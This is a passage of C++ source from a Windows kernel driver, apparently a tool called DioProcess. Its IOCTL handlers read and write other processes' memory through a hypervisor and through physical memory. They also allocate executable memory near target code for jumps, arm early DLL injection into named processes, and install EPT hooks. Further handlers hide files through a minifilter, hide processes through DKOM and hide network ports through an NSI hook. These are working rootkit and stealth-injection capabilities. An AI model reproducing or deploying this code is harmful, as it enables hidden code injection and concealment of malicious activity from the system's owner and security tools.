	return status;
}

// ============== Ring -1 Memory Read/Write Handlers (HV Scanner) ==============

NTSTATUS HandleHvReadVm(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	// Validate hypervisor is running
	if (!HvIsHypervisorRunning())
	{
		KdPrint((DRIVER_PREFIX "Hypervisor not running, cannot perform ring -1 read\n"));
		return STATUS_HV_NOT_PRESENT;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(HvReadVmRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	// Output buffer needs space for response header + data
	if (outputLen < sizeof(HvReadVmResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HvReadVmRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Size == 0)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Limit read size
	ULONG readSize = min(request->Size, HV_READ_VM_MAX_SIZE);

	// Check output buffer can hold response + data
	ULONG requiredOutput = sizeof(HvReadVmResponse) + readSize;
	if (outputLen < requiredOutput)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	// Response is at the start of the buffer, data follows
	auto response = (HvReadVmResponse*)Irp->AssociatedIrp.SystemBuffer;
	PUCHAR dataBuffer = (PUCHAR)Irp->AssociatedIrp.SystemBuffer + sizeof(HvReadVmResponse);

	// Perform the hypervisor read
	ULONG64 bytesRead = HvReadVirtualMemory(
		request->ProcessId,
		request->VirtualAddress,
		dataBuffer,
		readSize
	);

	response->BytesRead = (ULONG)bytesRead;
	response->Success = (bytesRead > 0) ? TRUE : FALSE;

	*info = sizeof(HvReadVmResponse) + (ULONG)bytesRead;
	return STATUS_SUCCESS;
}

NTSTATUS HandleHvWriteVm(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	// Validate hypervisor is running
	if (!HvIsHypervisorRunning())
	{
		KdPrint((DRIVER_PREFIX "Hypervisor not running, cannot perform ring -1 write\n"));
		return STATUS_HV_NOT_PRESENT;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(HvWriteVmRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(HvWriteVmResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HvWriteVmRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Size == 0)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Validate input buffer contains the data
	SIZE_T expectedSize = FIELD_OFFSET(HvWriteVmRequest, Data) + request->Size;
	if (inputLen < expectedSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	// Limit write size
	ULONG writeSize = min(request->Size, HV_READ_VM_MAX_SIZE);

	// Perform the hypervisor write
	ULONG64 bytesWritten = HvWriteVirtualMemory(
		request->ProcessId,
		request->VirtualAddress,
		(PVOID)request->Data,
		writeSize
	);

	auto response = (HvWriteVmResponse*)Irp->AssociatedIrp.SystemBuffer;
	response->BytesWritten = (ULONG)bytesWritten;
	response->Success = (bytesWritten > 0) ? TRUE : FALSE;

	*info = sizeof(HvWriteVmResponse);
	return STATUS_SUCCESS;
}

// Allocate memory near an address and write via kernel/HV - no usermode API
NTSTATUS HandleHvAllocWriteNear(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	// Validate hypervisor is running
	if (!HvIsHypervisorRunning())
	{
		KdPrint((DRIVER_PREFIX "Hypervisor not running, cannot perform ring -1 alloc+write\n"));
		return STATUS_HV_NOT_PRESENT;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(HvAllocWriteNearRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(HvAllocWriteNearResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (HvAllocWriteNearRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Size == 0)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Validate input buffer contains the data
	SIZE_T expectedSize = FIELD_OFFSET(HvAllocWriteNearRequest, Data) + request->Size;
	if (inputLen < expectedSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	KdPrint((DRIVER_PREFIX "HvAllocWriteNear: PID=%u, NearAddr=0x%llX, Size=%u\n",
		request->ProcessId, request->NearAddress, request->Size));

	// Get target process
	PEPROCESS targetProcess = NULL;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->ProcessId, &targetProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to lookup process: 0x%X\n", status));
		return status;
	}

	// Attach to target process to allocate memory
	KAPC_STATE apcState;
	KeStackAttachProcess(targetProcess, &apcState);

	// Try to allocate near the target address (within ±2GB for rel32 JMP)
	PVOID allocatedAddress = NULL;
	SIZE_T regionSize = request->Size;
	ULONG64 nearAddr = request->NearAddress;

	// Search for free region near the target address
	// Start from nearAddr - 0x70000000 and search upward
	ULONG64 searchStart = (nearAddr > 0x70000000) ? (nearAddr - 0x70000000) : 0x10000;
	ULONG64 searchEnd = nearAddr + 0x70000000;

	for (ULONG64 addr = searchStart; addr < searchEnd; addr += 0x10000)
	{
		allocatedAddress = (PVOID)addr;
		regionSize = request->Size;

		status = ZwAllocateVirtualMemory(
			ZwCurrentProcess(),
			&allocatedAddress,
			0,
			&regionSize,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
		);

		if (NT_SUCCESS(status))
		{
			// Check if within ±2GB
			INT64 offset = (INT64)allocatedAddress - (INT64)nearAddr;
			if (offset >= -0x7FFFFFFF && offset <= 0x7FFFFFFF)
			{
				KdPrint((DRIVER_PREFIX "Allocated at 0x%p (offset %lld from target)\n", allocatedAddress, offset));
				break;
			}
			else
			{
				// Too far, free and continue searching
				SIZE_T freeSize = 0;
				ZwFreeVirtualMemory(ZwCurrentProcess(), &allocatedAddress, &freeSize, MEM_RELEASE);
				allocatedAddress = NULL;
			}
		}
		else
		{
			allocatedAddress = NULL;
		}
	}

	if (!allocatedAddress)
	{
		KeUnstackDetachProcess(&apcState);
		ObDereferenceObject(targetProcess);
		KdPrint((DRIVER_PREFIX "Failed to allocate memory near 0x%llX\n", nearAddr));
		return STATUS_NO_MEMORY;
	}

	// Touch the memory to page it in - hypervisor needs physical backing
	__try
	{
		RtlZeroMemory(allocatedAddress, request->Size);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Failed to touch memory: exception\n"));
		SIZE_T freeSize = 0;
		ZwFreeVirtualMemory(ZwCurrentProcess(), &allocatedAddress, &freeSize, MEM_RELEASE);
		KeUnstackDetachProcess(&apcState);
		ObDereferenceObject(targetProcess);
		return STATUS_ACCESS_VIOLATION;
	}

	KeUnstackDetachProcess(&apcState);

	// Now use hypervisor to write the data (ring -1 write)
	ULONG64 bytesWritten = HvWriteVirtualMemory(
		request->ProcessId,
		(ULONG64)allocatedAddress,
		(PVOID)request->Data,
		request->Size
	);

	ObDereferenceObject(targetProcess);

	auto response = (HvAllocWriteNearResponse*)Irp->AssociatedIrp.SystemBuffer;
	response->AllocatedAddress = (ULONG64)allocatedAddress;
	response->BytesWritten = (ULONG)bytesWritten;
	response->Success = (bytesWritten == request->Size) ? TRUE : FALSE;

	KdPrint((DRIVER_PREFIX "HvAllocWriteNear: Allocated=0x%llX, Written=%llu, Success=%d\n",
		response->AllocatedAddress, bytesWritten, response->Success));

	*info = sizeof(HvAllocWriteNearResponse);
	return STATUS_SUCCESS;
}

// ============== Early Injection Handlers ==============

NTSTATUS HandleEarlyInjectArm(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "Early injection ARM request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(EarlyInjectionArmRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (EarlyInjectionArmRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Ensure strings are null-terminated
	request->TargetProcessName[MAX_TARGET_PROCESS_NAME - 1] = L'\0';
	request->DllPath[MAX_DLL_PATH_LENGTH - 1] = L'\0';

	KdPrint((DRIVER_PREFIX "Arming early injection: Target=%ws, DLL=%ws, Method=%d, OneShot=%d\n",
		request->TargetProcessName, request->DllPath, request->Method, request->OneShot));

	// Auto-register required callbacks if not already registered
	if (!g_CallbacksRegistered)
	{
		NTSTATUS cbStatus;

		// Register process callback (needed for Trampoline method)
		cbStatus = PsSetCreateProcessNotifyRoutineEx(OnProcessCallback, FALSE);
		if (!NT_SUCCESS(cbStatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to register process callback for early injection (0x%X)\n", cbStatus));
			return cbStatus;
		}
		KdPrint((DRIVER_PREFIX "Process callback registered for early injection\n"));

		// Register image load callback (needed for APC method)
		cbStatus = PsSetLoadImageNotifyRoutine(OnImageLoadCallback);
		if (!NT_SUCCESS(cbStatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to register image load callback for early injection (0x%X)\n", cbStatus));
			// Unregister process callback on failure
			PsSetCreateProcessNotifyRoutineEx(OnProcessCallback, TRUE);
			return cbStatus;
		}
		KdPrint((DRIVER_PREFIX "Image load callback registered for early injection\n"));

		g_CallbacksRegistered = TRUE;
		KdPrint((DRIVER_PREFIX "Callbacks auto-registered for early injection\n"));
	}

	NTSTATUS status = EarlyInjectionArm(
		request->TargetProcessName,
		request->DllPath,
		request->Method,
		request->OneShot
	);

	return status;
}

NTSTATUS HandleEarlyInjectDisarm(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(irpSp);

	KdPrint((DRIVER_PREFIX "Early injection DISARM request\n"));

	return EarlyInjectionDisarm();
}

NTSTATUS HandleEarlyInjectStatus(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Early injection STATUS request\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	if (outputLen < sizeof(EarlyInjectionStatusResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (EarlyInjectionStatusResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	EarlyInjectionGetStatus(response);

	*info = sizeof(EarlyInjectionStatusResponse);
	return STATUS_SUCCESS;
}

// ============== Kernel Memory Copy (KsDumper-style) ==============

// MmCopyVirtualMemory declaration (undocumented)
extern "C" NTSTATUS NTAPI MmCopyVirtualMemory(
	PEPROCESS SourceProcess,
	PVOID SourceAddress,
	PEPROCESS TargetProcess,
	PVOID TargetAddress,
	SIZE_T BufferSize,
	KPROCESSOR_MODE PreviousMode,
	PSIZE_T ReturnSize
);

NTSTATUS HandleCopyMemory(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Kernel memory copy request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(KernelCopyMemoryRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	if (outputLen < sizeof(KernelCopyMemoryResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (KernelCopyMemoryRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	auto response = (KernelCopyMemoryResponse*)Irp->AssociatedIrp.SystemBuffer;

	// Validate input parameters
	if (request->Size == 0 || request->Size > 64 * 1024 * 1024)  // Max 64MB per request
	{
		KdPrint((DRIVER_PREFIX "Invalid copy size: %u\n", request->Size));
		response->BytesCopied = 0;
		response->Success = FALSE;
		*info = sizeof(KernelCopyMemoryResponse);
		return STATUS_INVALID_PARAMETER;
	}

	// Lookup target process
	PEPROCESS targetProcess = NULL;
	NTSTATUS status = PsLookupProcessByProcessId(
		(HANDLE)(ULONG_PTR)request->TargetProcessId,
		&targetProcess
	);

	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Failed to lookup process %u: 0x%X\n", request->TargetProcessId, status));
		response->BytesCopied = 0;
		response->Success = FALSE;
		*info = sizeof(KernelCopyMemoryResponse);
		return status;
	}

	// Perform kernel memory copy using MmCopyVirtualMemory
	SIZE_T bytesCopied = 0;
	status = MmCopyVirtualMemory(
		targetProcess,
		(PVOID)request->SourceAddress,
		PsGetCurrentProcess(),
		(PVOID)request->DestinationAddress,
		request->Size,
		UserMode,
		&bytesCopied
	);

	ObDereferenceObject(targetProcess);

	if (NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "Memory copy successful: PID %u, Address 0x%llX, Size %u, Copied %llu\n",
			request->TargetProcessId, request->SourceAddress, request->Size, bytesCopied));
		response->BytesCopied = (ULONG)bytesCopied;
		response->Success = TRUE;
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Memory copy failed: 0x%X\n", status));
		response->BytesCopied = 0;
		response->Success = FALSE;
	}

	*info = sizeof(KernelCopyMemoryResponse);
	return status;
}

// ============== File Hiding IOCTL Handlers ==============

NTSTATUS HandleFileHideHide(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "FileHide: Hide request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(FileHideRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (FileHideRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Lazy init: start minifilter on first use
	if (!g_FileHideInitialized)
	{
		NTSTATUS initStatus = FileHide_Init(g_DriverObject, &g_RegistryPath);
		if (!NT_SUCCESS(initStatus))
		{
			KdPrint((DRIVER_PREFIX "FileHide: Lazy init failed (0x%08X)\n", initStatus));
			return initStatus;
		}
	}

	// Ensure null-terminated
	request->FilePath[259] = L'\0';

	return FileHide_AddPath(request->FilePath);
}

NTSTATUS HandleFileHideUnhide(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "FileHide: Unhide request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(FileHideRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (FileHideRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Ensure null-terminated
	request->FilePath[259] = L'\0';

	return FileHide_RemovePath(request->FilePath);
}

NTSTATUS HandleFileHideList(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "FileHide: List request\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	if (outputLen < sizeof(FileHideListResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (FileHideListResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, sizeof(FileHideListResponse));

	NTSTATUS status = FileHide_ListPaths(
		(WCHAR(*)[260])response->Entries,
		&response->Count,
		MAX_FILEHIDE_ENTRIES
	);

	if (NT_SUCCESS(status))
	{
		*info = sizeof(FileHideListResponse);
	}

	return status;
}

// ============== DKOM Process Hiding Handlers ==============

NTSTATUS HandleProcessHide(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(TargetProcessRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	return ProcessHide_Hide(request->ProcessId);
}

NTSTATUS HandleProcessUnhide(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(TargetProcessRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	return ProcessHide_Unhide(request->ProcessId);
}

NTSTATUS HandleProcessHideList(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	if (outputLen < sizeof(ProcessHideListResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto response = (ProcessHideListResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
		return STATUS_INVALID_PARAMETER;

	RtlZeroMemory(response, sizeof(ProcessHideListResponse));

	NTSTATUS status = ProcessHide_List(response->Entries, &response->Count, MAX_DKOM_HIDDEN_PROCESSES);

	if (NT_SUCCESS(status))
	{
		*info = sizeof(ProcessHideListResponse);
	}

	return status;
}

// ============== Physical Memory Handlers ==============

NTSTATUS HandleTranslateVA(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint(("DioProcess: TranslateVA request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(TranslateVaRequest))
		return STATUS_BUFFER_TOO_SMALL;

	if (outputLen < sizeof(TranslateVaResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (TranslateVaRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	ULONG64 cr3 = PhysMemGetProcessCR3(request->ProcessId);
	if (!cr3)
		return STATUS_NOT_FOUND;

	auto response = (TranslateVaResponse*)Irp->AssociatedIrp.SystemBuffer;
	NTSTATUS status = PhysMemTranslateVA(cr3, request->VirtualAddress, response);

	if (NT_SUCCESS(status))
	{
		*info = sizeof(TranslateVaResponse);
	}

	return status;
}

NTSTATUS HandleReadPhysical(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint(("DioProcess: ReadPhysical request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(PhysicalMemoryRequest))
		return STATUS_BUFFER_TOO_SMALL;

	if (outputLen < sizeof(PhysicalMemoryResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (PhysicalMemoryRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	if (request->Size == 0 || request->Size > 4096)
		return STATUS_INVALID_PARAMETER;

	if (!request->BufferAddress)
		return STATUS_INVALID_PARAMETER;

	// Allocate kernel buffer for the read
	PVOID kernelBuf = ExAllocatePoolWithTag(NonPagedPool, request->Size, 'rPhM');
	if (!kernelBuf)
		return STATUS_INSUFFICIENT_RESOURCES;

	SIZE_T bytesRead = 0;
	NTSTATUS status = PhysMemReadPhysical(request->PhysicalAddress, kernelBuf, request->Size, &bytesRead);

	auto response = (PhysicalMemoryResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (NT_SUCCESS(status))
	{
		// Copy to usermode buffer
		__try
		{
			ProbeForWrite((PVOID)request->BufferAddress, request->Size, 1);
			RtlCopyMemory((PVOID)request->BufferAddress, kernelBuf, bytesRead);
			response->BytesTransferred = (ULONG)bytesRead;
			response->Success = 1;
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			response->BytesTransferred = 0;
			response->Success = 0;
			status = GetExceptionCode();
		}
	}
	else
	{
		response->BytesTransferred = 0;
		response->Success = 0;
	}

	ExFreePoolWithTag(kernelBuf, 'rPhM');
	*info = sizeof(PhysicalMemoryResponse);
	return STATUS_SUCCESS; // Always return success so response is delivered
}

NTSTATUS HandleWritePhysical(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint(("DioProcess: WritePhysical request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(PhysicalMemoryRequest))
		return STATUS_BUFFER_TOO_SMALL;

	if (outputLen < sizeof(PhysicalMemoryResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (PhysicalMemoryRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	if (request->Size == 0 || request->Size > 4096)
		return STATUS_INVALID_PARAMETER;

	if (!request->BufferAddress)
		return STATUS_INVALID_PARAMETER;

	// Copy from usermode buffer to kernel buffer first
	PVOID kernelBuf = ExAllocatePoolWithTag(NonPagedPool, request->Size, 'wPhM');
	if (!kernelBuf)
		return STATUS_INSUFFICIENT_RESOURCES;

	__try
	{
		ProbeForRead((PVOID)request->BufferAddress, request->Size, 1);
		RtlCopyMemory(kernelBuf, (PVOID)request->BufferAddress, request->Size);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		ExFreePoolWithTag(kernelBuf, 'wPhM');
		return GetExceptionCode();
	}

	SIZE_T bytesWritten = 0;
	NTSTATUS status = PhysMemWritePhysical(request->PhysicalAddress, kernelBuf, request->Size, &bytesWritten);

	auto response = (PhysicalMemoryResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (NT_SUCCESS(status))
	{
		response->BytesTransferred = (ULONG)bytesWritten;
		response->Success = 1;
	}
	else
	{
		response->BytesTransferred = 0;
		response->Success = 0;
	}

	ExFreePoolWithTag(kernelBuf, 'wPhM');
	*info = sizeof(PhysicalMemoryResponse);
	return STATUS_SUCCESS;
}

// ============== Bulk Virtual Memory Read via CR3 Walk ==============

NTSTATUS HandlePhysReadVm(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint(("DioProcess: PhysReadVm request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(PhysReadVmRequest))
		return STATUS_BUFFER_TOO_SMALL;

	if (outputLen < sizeof(PhysReadVmResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (PhysReadVmRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
		return STATUS_INVALID_PARAMETER;

	if (request->Size == 0 || request->Size > PHYS_READ_VM_MAX_SIZE)
		return STATUS_INVALID_PARAMETER;

	// Check output buffer can hold response header + data
	ULONG requiredOutput = sizeof(PhysReadVmResponse) + request->Size;
	if (outputLen < requiredOutput)
		return STATUS_BUFFER_TOO_SMALL;

	// Save request fields before overwriting SystemBuffer with response
	ULONG pid = request->ProcessId;
	ULONG64 va = request->VirtualAddress;
	ULONG size = request->Size;

	// Allocate kernel buffer for the read
	PVOID kernelBuf = ExAllocatePoolWithTag(NonPagedPool, size, 'rVmP');
	if (!kernelBuf)
		return STATUS_INSUFFICIENT_RESOURCES;

	SIZE_T bytesRead = 0;
	NTSTATUS status = PhysMemReadVirtualMemory(pid, va, kernelBuf, size, &bytesRead);

	// Write response header
	auto response = (PhysReadVmResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (NT_SUCCESS(status) && bytesRead > 0)
	{
		response->BytesRead = (ULONG)bytesRead;
		response->Success = 1;

		// Copy read data after response header
		PUCHAR dataOutput = (PUCHAR)Irp->AssociatedIrp.SystemBuffer + sizeof(PhysReadVmResponse);
		RtlCopyMemory(dataOutput, kernelBuf, bytesRead);

		*info = sizeof(PhysReadVmResponse) + (ULONG)bytesRead;
	}
	else
	{
		response->BytesRead = 0;
		response->Success = 0;
		*info = sizeof(PhysReadVmResponse);
	}

	ExFreePoolWithTag(kernelBuf, 'rVmP');
	return STATUS_SUCCESS;
}

// ============== VM Region Enumeration Handler ==============

NTSTATUS HandleEnumVmRegions(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint(("DioProcess: EnumVmRegions request\n"));

	auto inputLen  = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(EnumVmRegionsRequest))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (EnumVmRegionsRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->ProcessId == 0)
		return STATUS_INVALID_PARAMETER;

	ULONG pid = request->ProcessId;

	// Calculate how many entries fit in the caller's output buffer
	// FIELD_OFFSET is the WDK equivalent of offsetof
	ULONG headerSize    = FIELD_OFFSET(EnumVmRegionsResponse, Entries);
	ULONG entrySize     = (ULONG)sizeof(VmRegionEntry);

	if (outputLen < headerSize + entrySize)
		return STATUS_BUFFER_TOO_SMALL;

	ULONG maxFromBuf    = (outputLen - headerSize) / entrySize;
	ULONG maxEntries    = min(maxFromBuf, (ULONG)MAX_VM_REGION_ENTRIES);

	// Allocate temporary kernel buffer for entries
	SIZE_T entriesBufSize = (SIZE_T)maxEntries * entrySize;
	VmRegionEntry* entries = (VmRegionEntry*)ExAllocatePoolWithTag(NonPagedPool, entriesBufSize, 'gRmV');
	if (!entries)
		return STATUS_INSUFFICIENT_RESOURCES;

	RtlZeroMemory(entries, entriesBufSize);

	ULONG count  = 0;
	NTSTATUS status = PhysMemEnumVmRegions(pid, entries, maxEntries, &count);

	if (NT_SUCCESS(status))
	{
		auto response        = (EnumVmRegionsResponse*)Irp->AssociatedIrp.SystemBuffer;
		response->Count      = count;
		response->_pad       = 0;

		if (count > 0)
			RtlCopyMemory(response->Entries, entries, (SIZE_T)count * entrySize);

		*info = headerSize + (ULONG_PTR)count * entrySize;
	}

	ExFreePoolWithTag(entries, 'gRmV');
	return NT_SUCCESS(status) ? STATUS_SUCCESS : status;
}

// ============== NSI Port Hiding Handlers ==============

NTSTATUS HandlePortHide(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "PortHide: Hide request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(PortHideRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (PortHideRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	if (request->Port == 0)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Lazy init: install NSI hook on first use
	if (!g_PortHideInitialized)
	{
		NTSTATUS initStatus = PortHide_Init(nullptr);
		if (!NT_SUCCESS(initStatus))
		{
			KdPrint((DRIVER_PREFIX "PortHide: Lazy init failed (0x%08X)\n", initStatus));
			return initStatus;
		}
	}

	return PortHide_AddPort(request->Port);
}

NTSTATUS HandlePortUnhide(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "PortHide: Unhide request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(PortUnhideRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (PortUnhideRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	return PortHide_RemovePort(request->Index);
}

NTSTATUS HandlePortHideList(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "PortHide: List request\n"));

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	if (outputLen < sizeof(PortHideListResponse))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (PortHideListResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, sizeof(PortHideListResponse));

	NTSTATUS status = PortHide_GetList(
		response->Entries,
		&response->Count,
		MAX_PORTHIDE_ENTRIES
	);

	if (NT_SUCCESS(status))
	{
		*info = sizeof(PortHideListResponse);
	}

	return status;
}

// ============== Usermode EPT Hook Handlers ==============

NTSTATUS HandleEptHookInstall(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "EPT Hook install request\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	if (inputLen < sizeof(EptHookInstallRequest))
		return STATUS_BUFFER_TOO_SMALL;

	if (outputLen < sizeof(EptHookInstallResponse))
		return STATUS_BUFFER_TOO_SMALL;

	auto request = (EptHookInstallRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->PatchSize == 0 || request->PatchSize > 256)
		return STATUS_INVALID_PARAMETER;

	ULONG hookIndex = 0;
	NTSTATUS status = UsermodeEptHook_Install(
		request->ProcessId,
		request->TargetVirtualAddress,
		(PVOID)request->PatchBytes,
		request->PatchSize,
		&hookIndex
	);

	auto response = (EptHookInstallResponse*)Irp->AssociatedIrp.SystemBuffer;

	if (NT_SUCCESS(status))
	{
		response->HookIndex = hookIndex;
		response->Success = TRUE;
	}
	else
	{
		response->HookIndex = 0;
		response->Success = FALSE;
	}

